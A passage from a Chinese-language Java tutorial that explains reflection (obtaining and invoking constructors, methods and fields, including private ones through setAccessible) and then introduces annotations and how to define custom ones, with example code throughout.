属性赋值为 Bob，f2 属性即为 私有属性 name</span></span><br><span class="line">f2.set(p2,<span class="string">"Bob"</span>);</span><br><span class="line"><span class="comment">//使用反射机制可以打破封装性，导致了java对象的属性不安全。</span></span><br><span class="line">System.out.println(f2.get(p2)); <span class="comment">//Bob</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取构造方法</span></span><br><span class="line">Constructor [] constructors = c2.getConstructors();</span><br><span class="line"><span class="keyword">for</span>(Constructor constructor : constructors)&#123;</span><br><span class="line">    System.out.println(constructor.toString());<span class="comment">//public com.ys.reflex.Person()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-3-反射之操作构造方法"><a href="#1-3-反射之操作构造方法" class="headerlink" title="1.3 反射之操作构造方法"></a>1.3 反射之操作构造方法</h2><h3 id="1-3-1-Constructor类概述"><a href="#1-3-1-Constructor类概述" class="headerlink" title="1.3.1 Constructor类概述"></a>1.3.1 Constructor类概述</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">反射之操作构造方法的目的</span><br><span class="line">    * 获得Constructor对象来创建类的对象。</span><br><span class="line"></span><br><span class="line">Constructor类概述</span><br><span class="line">    * 类中的每一个构造方法都是一个Constructor类的对象</span><br></pre></td></tr></table></figure>

<h3 id="1-3-2-Class类中与Constructor相关的方法"><a href="#1-3-2-Class类中与Constructor相关的方法" class="headerlink" title="1.3.2 Class类中与Constructor相关的方法"></a>1.3.2 Class类中与Constructor相关的方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="function">Constructor <span class="title">getConstructor</span><span class="params">(Class... parameterTypes)</span></span></span><br><span class="line"><span class="function">        * 根据参数类型获得对应的Constructor对象。</span></span><br><span class="line"><span class="function">        * 只能获得<span class="keyword">public</span>修饰的构造方法</span></span><br><span class="line"><span class="function"> 2. Constructor <span class="title">getDeclaredConstructor</span><span class="params">(Class... parameterTypes)</span></span></span><br><span class="line"><span class="function">         * 根据参数类型获得对应的Constructor对象，包括<span class="keyword">private</span></span></span><br><span class="line"><span class="function"> 3. Constructor[] <span class="title">getConstructors</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        获得类中的所有构造方法对象，只能获得<span class="keyword">public</span>的</span></span><br><span class="line"><span class="function"> 4. Constructor[] <span class="title">getDeclaredConstructors</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        获得类中的所有构造方法对象，包括<span class="keyword">private</span>修饰的</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-3-Constructor对象常用方法"><a href="#1-3-3-Constructor对象常用方法" class="headerlink" title="1.3.3 Constructor对象常用方法"></a>1.3.3 Constructor对象常用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="function">T <span class="title">newInstance</span><span class="params">(Object... initargs)</span></span></span><br><span class="line"><span class="function"> 	根据指定的参数创建对象</span></span><br><span class="line"><span class="function">2. <span class="keyword">void</span> <span class="title">setAccessible</span><span class="params">(<span class="keyword">true</span>)</span></span></span><br><span class="line"><span class="function">   设置是否取消权限检查，<span class="keyword">true</span>取消权限检查，<span class="keyword">false</span>表示不取消<span class="params">(暴力反射)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-4-示例代码"><a href="#1-3-4-示例代码" class="headerlink" title="1.3.4 示例代码"></a>1.3.4 示例代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo03</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Constructor[] getConstructors()</span></span><br><span class="line"><span class="comment">           获得类中的所有构造方法对象，只能获得public的</span></span><br><span class="line"><span class="comment">      Constructor[] getDeclaredConstructors()</span></span><br><span class="line"><span class="comment">            获得类中的所有构造方法对象，包括private修饰的</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test03</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">//  获得类中的所有构造方法对象，只能获得public的</span></span><br><span class="line">        <span class="comment">// Constructor[] cons = c.getConstructors();</span></span><br><span class="line">        Constructor[] cons = c.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor con:cons) &#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Constructor getDeclaredConstructor(Class... parameterTypes)</span></span><br><span class="line"><span class="comment">           根据参数类型获得对应的Constructor对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获得两个参数构造方法对象</span></span><br><span class="line">        Constructor con = c.getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 取消权限检查(暴力反射)</span></span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 根据构造方法创建对象</span></span><br><span class="line">        Object obj = con.newInstance(<span class="string">"rose"</span>,<span class="string">"女"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Constructor getConstructor(Class... parameterTypes)</span></span><br><span class="line"><span class="comment">            根据参数类型获得对应的Constructor对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获得无参数构造方法对象</span></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        <span class="comment">// 根据构造方法创建对象</span></span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得有参数的构造方法对象</span></span><br><span class="line">        Constructor con2 = c.getConstructor(String<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        Object obj2 = con2.newInstance(<span class="string">"jack"</span>, <span class="string">"男"</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-4-反射之操作成员方法"><a href="#1-4-反射之操作成员方法" class="headerlink" title="1.4 反射之操作成员方法"></a>1.4 反射之操作成员方法</h2><h3 id="1-4-1-Method类概述"><a href="#1-4-1-Method类概述" class="headerlink" title="1.4.1 Method类概述"></a>1.4.1 Method类概述</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">反射之操作成员方法的目的</span><br><span class="line">    * 操作Method对象来调用成员方法</span><br><span class="line">Method类概述</span><br><span class="line">    * 每一个成员方法都是一个Method类的对象。</span><br></pre></td></tr></table></figure>

<h3 id="1-4-2-Class类中与Method相关的方法"><a href="#1-4-2-Class类中与Method相关的方法" class="headerlink" title="1.4.2 Class类中与Method相关的方法"></a>1.4.2 Class类中与Method相关的方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* <span class="function">Method <span class="title">getMethod</span><span class="params">(String name,Class...args)</span></span>;</span><br><span class="line">    * 根据方法名和参数类型获得对应的构造方法对象，只能获得<span class="keyword">public</span>的</span><br><span class="line"></span><br><span class="line">* <span class="function">Method <span class="title">getDeclaredMethod</span><span class="params">(String name,Class...args)</span></span>;</span><br><span class="line">    * 根据方法名和参数类型获得对应的构造方法对象，包括<span class="keyword">private</span>的</span><br><span class="line"></span><br><span class="line">* Method[] getMethods();</span><br><span class="line">    * 获得类中的所有成员方法对象，返回数组，只能获得<span class="keyword">public</span>修饰的且包含父类的</span><br><span class="line"></span><br><span class="line">* Method[] getDeclaredMethods();</span><br><span class="line">    * 获得类中的所有成员方法对象，返回数组,只获得本类的，包含<span class="keyword">private</span>修饰的</span><br></pre></td></tr></table></figure>

<h3 id="1-4-3-Method对象常用方法"><a href="#1-4-3-Method对象常用方法" class="headerlink" title="1.4.3 Method对象常用方法"></a>1.4.3 Method对象常用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*  <span class="function">Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function">    * 调用指定对象obj的该方法</span></span><br><span class="line"><span class="function">    * args：调用方法时传递的参数</span></span><br><span class="line"><span class="function">*  <span class="keyword">void</span> <span class="title">setAccessible</span><span class="params">(<span class="keyword">true</span>)</span></span></span><br><span class="line"><span class="function">    设置是否取消权限检查，<span class="keyword">true</span>取消权限检查，<span class="keyword">false</span>表示不取消<span class="params">(暴力反射)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-4-示例代码"><a href="#1-4-4-示例代码" class="headerlink" title="1.4.4 示例代码"></a>1.4.4 示例代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo04</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反射操作静态方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test04</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 根据方法名获得对应的成员方法对象</span></span><br><span class="line">        Method method = c.getDeclaredMethod(<span class="string">"eat"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 通过method执行对应的方法</span></span><br><span class="line">        method.invoke(<span class="keyword">null</span>,<span class="string">"蛋炒饭"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Method[] getMethods();</span></span><br><span class="line"><span class="comment">        * 获得类中的所有成员方法对象，返回数组，只能获得public修饰的且包含父类的</span></span><br><span class="line"><span class="comment">     * Method[] getDeclaredMethods();</span></span><br><span class="line"><span class="comment">        * 获得类中的所有成员方法对象，返回数组,只获得本类的，包含private修饰的</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test03</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获得类中的所有成员方法对象，返回数组，只能获得public修饰的且包含父类的</span></span><br><span class="line">        <span class="comment">// Method[] methods = c.getMethods();</span></span><br><span class="line">        <span class="comment">// 获得类中的所有成员方法对象，返回数组,只获得本类的，包含private修饰的</span></span><br><span class="line">        Method[] methods = c.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m: methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Method getDeclaredMethod(String name,Class...args);</span></span><br><span class="line"><span class="comment">           * 根据方法名和参数类型获得对应的构造方法对象，</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据Class对象创建学生对象</span></span><br><span class="line">        Student stu = (Student) c.newInstance();</span><br><span class="line">        <span class="comment">// 获得sleep方法对应的Method对象</span></span><br><span class="line">        Method m =  c.getDeclaredMethod(<span class="string">"sleep"</span>);</span><br><span class="line">        <span class="comment">// 暴力反射</span></span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过m对象执行stuy方法</span></span><br><span class="line">        m.invoke(stu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Method getMethod(String name,Class...args);</span></span><br><span class="line"><span class="comment">            * 根据方法名和参数类型获得对应的构造方法对象，</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 根据Class对象创建学生对象</span></span><br><span class="line">        Student stu = (Student) c.newInstance();</span><br><span class="line">        <span class="comment">// 获得study方法对应的Method对象</span></span><br><span class="line">        Method m =  c.getMethod(<span class="string">"study"</span>);</span><br><span class="line">        <span class="comment">// 通过m对象执行stuy方法</span></span><br><span class="line">        m.invoke(stu);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// 获得study方法对应的Method对象</span></span><br><span class="line">        Method m2  = c.getMethod(<span class="string">"study"</span>, <span class="keyword">int</span><span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 通过m2对象执行stuy方法</span></span><br><span class="line">        m2.invoke(stu,<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-反射之操作成员变量"><a href="#1-5-反射之操作成员变量" class="headerlink" title="1.5 反射之操作成员变量"></a>1.5 反射之操作成员变量</h2><h3 id="1-5-1-Field类概述"><a href="#1-5-1-Field类概述" class="headerlink" title="1.5.1 Field类概述"></a>1.5.1 Field类概述</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">反射之操作成员变量的目的</span><br><span class="line">    * 通过Field对象给对应的成员变量赋值和取值</span><br><span class="line"></span><br><span class="line">Field类概述</span><br><span class="line">    * 每一个成员变量都是一个Field类的对象。</span><br></pre></td></tr></table></figure>

<h3 id="1-5-2-Class类中与Field相关的方法"><a href="#1-5-2-Class类中与Field相关的方法" class="headerlink" title="1.5.2 Class类中与Field相关的方法"></a>1.5.2 Class类中与Field相关的方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* <span class="function">Field <span class="title">getField</span><span class="params">(String name)</span></span>;</span><br><span class="line">    *  根据成员变量名获得对应Field对象，只能获得<span class="keyword">public</span>修饰</span><br><span class="line">* <span class="function">Field <span class="title">getDeclaredField</span><span class="params">(String name)</span></span>;</span><br><span class="line">    *  根据成员变量名获得对应Field对象，包含<span class="keyword">private</span>修饰的</span><br><span class="line">* Field[] getFields();</span><br><span class="line">    * 获得所有的成员变量对应的Field对象，只能获得<span class="keyword">public</span>的</span><br><span class="line">* Field[] getDeclaredFields();</span><br><span class="line">    * 获得所有的成员变量对应的Field对象，包含<span class="keyword">private</span>的</span><br></pre></td></tr></table></figure>

<h3 id="1-5-3-Field对象常用方法"><a href="#1-5-3-Field对象常用方法" class="headerlink" title="1.5.3 Field对象常用方法"></a>1.5.3 Field对象常用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">set</span><span class="params">(Object obj, Object value)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setInt</span><span class="params">(Object obj, <span class="keyword">int</span> i)</span> 	</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setLong</span><span class="params">(Object obj, <span class="keyword">long</span> l)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setBoolean</span><span class="params">(Object obj, <span class="keyword">boolean</span> z)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setDouble</span><span class="params">(Object obj, <span class="keyword">double</span> d)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Object <span class="title">get</span><span class="params">(Object obj)</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span>	<span class="title">getInt</span><span class="params">(Object obj)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getLong</span><span class="params">(Object obj)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">getBoolean</span><span class="params">(Object ob)</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getDouble</span><span class="params">(Object obj)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setAccessible</span><span class="params">(<span class="keyword">true</span>)</span></span>;暴力反射，设置为可以直接访问私有类型的属性。</span><br><span class="line"><span class="function">Class <span class="title">getType</span><span class="params">()</span></span>; 获取属性的类型，返回Class对象。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>setXxx方法都是给对象obj的属性设置使用，针对不同的类型选取不同的方法。</p>
<p>getXxx方法是获取对象obj对应的属性值的，针对不同的类型选取不同的方法。</p>
</blockquote>
<h3 id="1-5-4-示例代码"><a href="#1-5-4-示例代码" class="headerlink" title="1.5.4 示例代码"></a>1.5.4 示例代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo05</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Field[] getFields();</span></span><br><span class="line"><span class="comment">            * 获得所有的成员变量对应的Field对象，只能获得public的</span></span><br><span class="line"><span class="comment">        Field[] getDeclaredFields();</span></span><br><span class="line"><span class="comment">            * 获得所有的成员变量对应的Field对象，包含private的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c  = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获得所有的成员变量对应的Field对象</span></span><br><span class="line">        <span class="comment">// Field[] fields = c.getFields();</span></span><br><span class="line">        <span class="comment">// 获得所有的成员变量对应的Field对象，包括private</span></span><br><span class="line">        Field[] fields = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f: fields) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Field getField(String name);</span></span><br><span class="line"><span class="comment">            根据成员变量名获得对应Field对象，只能获得public修饰</span></span><br><span class="line"><span class="comment">        Field getDeclaredField(String name);</span></span><br><span class="line"><span class="comment">            *  根据成员变量名获得对应Field对象，包含private修饰的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得Class对象</span></span><br><span class="line">        Class c  = Student<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        Object obj = c.newInstance();</span><br><span class="line">        <span class="comment">// 获得成员变量name对应的Field对象</span></span><br><span class="line">        Field f = c.getField(<span class="string">"name"</span>);</span><br><span class="line">        <span class="comment">// 给成员变量name赋值</span></span><br><span class="line">        <span class="comment">// 给指定对象obj的name属性赋值为jack</span></span><br><span class="line">        f.set(obj,<span class="string">"jack"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得指定对象obj成员变量name的值</span></span><br><span class="line">        System.out.println(f.get(obj)); <span class="comment">// jack</span></span><br><span class="line">        <span class="comment">// 获得成员变量的名字</span></span><br><span class="line">        System.out.println(f.getName()); <span class="comment">// name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 给成员变量gender赋值</span></span><br><span class="line">        <span class="comment">// 获得成员变量gender对应的Field对象</span></span><br><span class="line">        Field f1 = c.getDeclaredField(<span class="string">"gender"</span>);</span><br><span class="line">        <span class="comment">// 暴力反射</span></span><br><span class="line">        f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 给指定对象obj的gender属性赋值为男</span></span><br><span class="line">        f1.set(obj,<span class="string">"男"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第二章-注解"><a href="#第二章-注解" class="headerlink" title="第二章 注解"></a>第二章 注解</h1><h2 id="2-1-注解的概述"><a href="#2-1-注解的概述" class="headerlink" title="2.1 注解的概述"></a>2.1 注解的概述</h2><h3 id="2-1-1-注解的概念"><a href="#2-1-1-注解的概念" class="headerlink" title="2.1.1 注解的概念"></a>2.1.1 注解的概念</h3><ul>
<li><p>注解是JDK1.5的新特性。</p>
</li>
<li><p>注解相当一种标记，是类的组成部分，可以给类携带一些额外的信息。</p>
</li>
<li><p>标记(注解)可以加在包，类，字段，方法，方法参数以及局部变量上。</p>
</li>
<li><p>注解是给编译器或JVM看的，编译器或JVM可以根据注解来完成对应的功能。</p>
<h6 id="注解-Annotation-相当于一种标记，在程序中加入注解就等于为程序打上某种标记，以后，javac编译器、开发工具和其他程序可以通过反射来了解你的类及各种元素上有无何种-标记，看你的程序有什么标记，就去干相应的事，标记可以加在包、类，属性、方法，方法的参数以及局部变量上。"><a href="#注解-Annotation-相当于一种标记，在程序中加入注解就等于为程序打上某种标记，以后，javac编译器、开发工具和其他程序可以通过反射来了解你的类及各种元素上有无何种-标记，看你的程序有什么标记，就去干相应的事，标记可以加在包、类，属性、方法，方法的参数以及局部变量上。" class="headerlink" title="注解(Annotation)相当于一种标记，在程序中加入注解就等于为程序打上某种标记，以后，javac编译器、开发工具和其他程序可以通过反射来了解你的类及各种元素上有无何种    标记，看你的程序有什么标记，就去干相应的事，标记可以加在包、类，属性、方法，方法的参数以及局部变量上。"></a><em>注解(Annotation)相当于一种标记，在程序中加入注解就等于为程序打上某种标记，以后，javac编译器、开发工具和其他程序可以通过反射来了解你的类及各种元素上有无何种    标记，看你的程序有什么标记，就去干相应的事，标记可以加在包、类，属性、方法，方法的参数以及局部变量上。</em></h6></li>
</ul>
<h3 id="2-1-2-注解的作用"><a href="#2-1-2-注解的作用" class="headerlink" title="2.1.2 注解的作用"></a>2.1.2 注解的作用</h3><p> <strong>注解的作用就是给程序带入参数。</strong></p>
<p>以下几个常用操作中都使用到了注解：</p>
<ol>
<li><p><strong>生成帮助文档</strong>：<strong>@author和@version</strong></p>
<ul>
<li><p><strong>@author</strong>：用来标识作者姓名。</p>
</li>
<li><p><strong>@version</strong>：用于标识对象的版本号，适用范围：文件、类、方法。</p>
<ul>
<li><p>使用<strong>@author和@version</strong>注解就是告诉<strong>Javadoc工具</strong>在生成帮助文档时把作者姓名和版本号也标记在文档中。如下图：</p>
<p><img data-src="https://i.loli.net/2021/01/23/8K7u2mEfz56iBXR.png" alt="1566448263760"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>编译检查</strong>：<strong>@Override</strong></p>
<ul>
<li><p><strong>@Override</strong>：用来修饰方法声明。</p>
<ul>
<li>用来告诉<strong>编译器</strong>该方法是重写父类中的方法，如果父类不存在该方法，则编译失败。如下图</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/RSAKCLbjFf5HWli.png" alt="1566448286356"></p>
</li>
</ul>
</li>
<li><p><strong>框架的配置(框架=代码+配置)</strong></p>
<ul>
<li>具体使用请关注框架课程的内容的学习。</li>
</ul>
</li>
</ol>
<h3 id="2-1-3-常见注解"><a href="#2-1-3-常见注解" class="headerlink" title="2.1.3 常见注解"></a>2.1.3 常见注解</h3><ol>
<li><strong>@author</strong>：用来标识作者名，eclipse开发工具默认的是系统用户名。</li>
<li><strong>@version</strong>：用于标识对象的版本号，适用范围：文件、类、方法。</li>
<li><strong>@Override</strong> ：用来修饰方法声明，告诉编译器该方法是重写父类中的方法，如果父类不存在该方法，则编译失败。</li>
</ol>
<h2 id="2-2-自定义注解"><a href="#2-2-自定义注解" class="headerlink" title="2.2 自定义注解"></a>2.2 自定义注解</h2><h3 id="2-2-1-定义格式"><a href="#2-2-1-定义格式" class="headerlink" title="2.2.1 定义格式"></a>2.2.1 定义格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> 注解名&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">如：定义一个名为Student的注解</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Student &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-注解的属性"><a href="#2-2-2-注解的属性" class="headerlink" title="2.2.2 注解的属性"></a>2.2.2 注解的属性</h3><ol>
<li><p><strong>属性的格式</strong></p>
<ul>
<li><strong>格式1：数据类型 属性名();</strong></li>
<li><strong>格式2：数据类型 属性名() default 默认值;</strong></li>
</ul>
</li>
<li><p><strong>属性定义示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 姓名</span></span><br><span class="line"><span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 年龄</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">age</span><span class="params">()</span> <span class="keyword">default</span> 18</span>;</span><br><span class="line"><span class="comment">// 爱好</span></span><br><span class="line">String[] hobby();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>属性适用的数据类型</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* 八种数据数据类型(<span class="keyword">int</span>，<span class="keyword">short</span>，<span class="keyword">long</span>，<span class="keyword">double</span>，<span class="keyword">byte</span>，<span class="keyword">char</span>，<span class="keyword">boolean</span>，<span class="keyword">float</span>)</span><br><span class="line">* String，Class，注解类型，枚举类</span><br><span class="line">* 以上类型的数组形式</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="2-3-使用自定义注解"><a href="#2-3-使用自定义注解" class="headerlink" title="2.3 使用自定义注解"></a>2.3 使用自定义注解</h2><h3 id="2-3-1-定义和注解"><a href="#2-3-1-定义和注解" class="headerlink" title="2.3.1 定义和注解"></a>2.3.1 定义和注解</h3><ol>
<li><strong>定义一个注解：Book</strong><ul>
<li>包含属性：String value()   书名</li>
<li>包含属性：double price()  价格，默认值为 100</li>
<li>包含属性：String[] authors() 多位作者    </li>
</ul>
</li>
<li>代码实现</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Book &#123;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">price</span><span class="params">()</span> <span class="keyword">default</span> 100</span>;</span><br><span class="line">    String[] authros();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-2-使用注解"><a href="#2-3-2-使用注解" class="headerlink" title="2.3.2 使用注解"></a>2.3.2 使用注解</h3><ol>
<li><strong>定义类在成员方法上使用Book注解</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用注意事项<ul>
<li>如果属性有默认值，则使用注解的时候，这个属性可以不用赋值。</li>
<li>如果属性没有默认值，那么在使用注解时一定要给属性赋值。 </li>
</ul>
</li>
</ol>
